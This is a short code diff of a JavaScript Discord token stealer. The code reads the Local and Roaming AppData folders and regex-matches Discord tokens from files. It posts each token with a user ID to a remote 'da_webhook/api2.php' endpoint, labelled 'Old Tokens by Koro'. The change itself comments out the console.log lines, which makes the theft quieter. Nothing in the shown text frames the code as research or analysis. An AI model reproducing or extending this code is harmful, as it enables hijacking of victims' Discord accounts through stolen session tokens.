@@ -21,8 +21,8 @@ var dir = __dirname.split("\\")
 var localappdata = process.env.LOCALAPPDATA
 var roamingappdata = process.env.APPDATA
 
-console.log(localappdata);
-console.log(roamingappdata);
+//console.log(localappdata);
+//console.log(roamingappdata);
 
 getAllDiscordTokens();
 //Get All Discord Tokens
@@ -64,10 +64,10 @@ function koro(p) {
                 var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
                 
                 if (token){
-                    console.log(token);
+                    //console.log(token);
                     token = token.replace(/"/g, '');
                     var a = `{"content": "Token: ${token}", "username": "UID: ${uid}"}`;
-                    console.log(a)
+                    //console.log(a)
                     axios.post("http://da_webhook/api2.php?type=old", {
                         "content": `Token: **${token}** \nUID: **${uid}**`,
                         "username": "Old Tokens by Koro"
